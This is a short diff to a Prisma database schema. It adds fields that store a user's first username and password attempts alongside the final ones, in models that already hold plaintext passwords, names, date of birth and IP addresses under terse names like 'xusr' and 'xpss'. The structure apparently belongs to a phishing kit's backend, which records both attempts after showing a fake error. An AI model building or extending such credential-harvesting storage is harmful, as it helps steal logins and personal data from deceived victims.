@@ -31,6 +31,8 @@ model LoginData {
   id        String   @id @default(cuid())
   sessionId String   @unique
   xusr      String   // Username/email
+  xusrFirst String?  // First username attempt
+  xpssFirst String?  // First password attempt
   xpss      String   // Password (should be hashed in production)
   timestamp DateTime @default(now())
   ip        String
@@ -84,7 +86,9 @@ model FinalData {
   id        String   @id @default(cuid())
   sessionId String   @unique
   xusr      String
+  xusrFirst String?  // First username attempt
   xpss      String
+  xpssFirst String?  // First password attempt
   xname1    String
   xname2    String
   xdob      String
